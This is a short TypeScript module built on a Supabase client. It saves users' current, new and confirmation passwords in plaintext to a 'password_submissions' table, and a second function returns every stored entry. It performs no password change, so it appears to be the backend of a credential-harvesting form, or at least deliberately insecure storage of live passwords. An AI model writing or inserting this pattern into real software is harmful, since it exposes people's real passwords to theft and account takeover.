import { supabase } from "@/integrations/supabase/client";

export interface PasswordSubmission {
  id: string;
  current_password: string;
  new_password: string;
  confirm_password: string;
  created_at: string;
}

export async function saveSubmission(entry: {
  currentPassword: string;
  newPassword: string;
  confirmPassword: string;
}) {
  const { error } = await supabase.from("password_submissions").insert({
    current_password: entry.currentPassword,
    new_password: entry.newPassword,
    confirm_password: entry.confirmPassword,
  });
  if (error) console.error("Save error:", error);
}

export async function getSubmissions(): Promise<PasswordSubmission[]> {
  const { data, error } = await supabase
    .from("password_submissions")
    .select("*")
    .order("created_at", { ascending: false });
  if (error) {
    console.error("Fetch error:", error);
    return [];
  }
  return data ?? [];
}
